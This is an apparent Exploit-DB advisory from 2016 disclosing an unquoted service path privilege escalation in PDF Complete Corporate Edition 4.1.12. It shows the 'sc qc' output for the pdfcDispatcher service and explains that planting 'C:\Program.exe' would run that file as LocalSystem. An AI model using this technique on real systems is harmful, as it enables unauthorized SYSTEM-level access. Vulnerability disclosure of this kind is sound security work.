# Exploit Title: PDF Complete Corporate Edition - Unquoted Service Path Privilege Escalation
# Date: 10/19/2016
# Exploit Author: Joey Lane
# Software Link: http://www.pdfcomplete.com/cms/Downloads.aspx
# Version: 4.1.12
# Tested on: Windows 7 Professional

PDF Complete Corporate Edition installs a service with an unquoted service path.
This enables a local privilege escalation vulnerability.  To exploit this vulnerability,
a local attacker can insert an executable file in the path of the service.
Rebooting the system or restarting the service will run the malicious executable
with elevated privileges.


This was tested on version 4.1.12, but other versions may be affected as well.


---------------------------------------------------------------------------

C:\>sc qc pdfcDispatcher
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: pdfcDispatcher
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files (x86)\PDF Complete\pdfsvc.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : PDF Document Manager
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

---------------------------------------------------------------------------


EXAMPLE:

Using the BINARY_PATH_NAME listed above as an example, an executable named
"Program.exe" could be placed in "C:\", and it would be executed as the
Local System user next time the service was restarted.